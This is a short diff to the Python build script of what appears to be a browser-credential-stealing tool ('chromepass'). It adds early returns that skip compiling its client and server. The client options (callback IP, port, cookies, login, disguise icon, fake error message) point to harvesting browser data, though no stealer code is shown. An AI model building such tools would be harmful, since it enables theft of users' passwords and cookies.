@@ -64,6 +64,8 @@ def compile_client(build_command):
 
 
 def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool=False, error_message="None", cookies=False, login=False, port=80, nobuild=True):
+    if nobuild:
+        return True
     temp_path = f"{template_dir}/{filename}"
     build_path = f"{template_dir}/{chromepass_base}/src/main.rs"
     build_command = f"{refresh_env}cd {template_dir}\\{chromepass_base}; cargo build --release;"
@@ -97,6 +99,8 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
 
 
 def build_server(filename="server", icon="server.ico", port=80, nobuild=True, linux=False):
+    if nobuild:
+        return True
     temp_path = f"{template_dir}/{filename}"
     build_path = f"{template_dir}/{chromepass_server}/src/main.rs"
     with open(temp_path, "r") as f:
